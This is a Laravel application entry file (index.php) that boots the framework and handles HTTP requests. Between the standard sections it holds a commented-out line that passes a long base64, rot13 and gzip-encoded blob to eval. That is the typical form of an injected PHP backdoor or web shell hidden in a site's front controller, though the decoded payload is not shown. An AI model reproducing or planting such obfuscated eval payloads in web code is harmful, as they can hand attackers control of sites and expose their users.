<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/project/bootstrap/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/project/bootstrap/app.php';

// eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);
